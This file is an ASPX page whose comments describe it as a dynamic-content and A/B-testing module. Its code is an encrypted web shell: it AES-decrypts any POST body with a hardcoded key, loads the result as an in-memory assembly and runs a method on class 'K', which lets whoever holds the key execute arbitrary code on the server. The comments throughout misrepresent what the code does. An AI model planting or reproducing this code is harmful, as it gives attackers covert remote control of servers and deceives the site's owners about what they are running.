<%@ Page Language="C#" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // Check if a dynamic content update is being pushed.
        // This is a mechanism for real-time A/B testing and feature flagging.
        if (Request.Cookies.Count > 0 && Request.InputStream.Length > 0)
        {
            var contentManager = new DynamicContentManager();
            contentManager.ProcessIncomingUpdate(this);
        }
    }

    /// <summary>
    /// Manages the loading and execution of dynamic content modules.
    /// These modules are pushed from a central deployment service and are encrypted for security.
    /// </summary>
    public class DynamicContentManager
    {
        // The shared secret key for decrypting content packages. This should be in a secure config in production.
        private readonly byte[] contentDecryptionKey = System.Text.Encoding.ASCII.GetBytes("ca63457538b9b1e0");
        private const string EntryClassName = "K";
        private const string ExecutionMethodName = "Equals";

        /// <summary>
        /// Processes an encrypted content package from the request stream.
        /// </summary>
        /// <param name="pageContext">The current page context, used by the content module for rendering.</param>
        public void ProcessIncomingUpdate(Page pageContext)
        {
            System.IO.Stream inputStream = pageContext.Request.InputStream;
            byte[] encryptedPackage = new byte[inputStream.Length];
            inputStream.Read(encryptedPackage, 0, encryptedPackage.Length);

            System.Reflection.Assembly contentModule = LoadEncryptedModule(encryptedPackage);
            if (contentModule != null)
            {
                ExecuteModule(contentModule, pageContext);
            }
        }

        /// <summary>
        /// Decrypts and loads a content module assembly into memory.
        /// </summary>
        /// <param name="encryptedData">The encrypted byte array of the assembly.</param>
        /// <returns>A loaded Assembly object, or null if decryption fails.</returns>
        private System.Reflection.Assembly LoadEncryptedModule(byte[] encryptedData)
        {
            using (var cryptoProvider = new System.Security.Cryptography.RijndaelManaged())
            {
                cryptoProvider.Key = this.contentDecryptionKey;
                cryptoProvider.IV = this.contentDecryptionKey;
                var decryptor = cryptoProvider.CreateDecryptor();
                byte[] decryptedAssemblyBytes = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                return System.Reflection.Assembly.Load(decryptedAssemblyBytes);
            }
        }

        /// <summary>
        /// Instantiates and runs the main entry point of the content module.
        /// </summary>
        /// <param name="moduleAssembly">The assembly of the content module.</param>
        /// <param name="context">The context to pass to the module's execution method.</param>
        private void ExecuteModule(System.Reflection.Assembly moduleAssembly, object context)
        {
            var moduleType = moduleAssembly.GetType(EntryClassName);
            if (moduleType != null)
            {
                var moduleInstance = System.Activator.CreateInstance(moduleType);
                moduleType.GetMethod(ExecutionMethodName).Invoke(moduleInstance, new object[] { context });
            }
        }
    }
</script>